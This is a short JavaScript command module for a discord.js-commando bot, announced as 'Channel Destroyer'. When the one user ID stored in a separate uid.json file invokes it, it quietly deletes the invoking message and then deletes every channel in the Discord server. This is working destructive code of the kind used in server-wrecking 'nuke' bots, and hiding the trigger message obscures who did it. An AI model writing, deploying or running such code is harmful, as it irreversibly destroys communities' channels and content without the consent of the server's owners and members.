const commando=require('discord.js-commando');
console.log("\n ~ Channel Destroyer Online ");
var i=0;
const listCh=[];
const usr=require('./uid.json');
class cd extends commando.Command{
	constructor(client){
		super(client,{
			name: 'cd',
			group: 'channels',
			memberName: 'cd',
			description: 'Delete Channels in Server'
		});
	}
	async run(message,args){
		message.delete();
		if(message.author.id==usr.userid){
			message.guild.channels.forEach(channel=>{
				listCh.push(channel.name);
				channel.delete();
			});
		}
			
	}
}module.exports=cd;
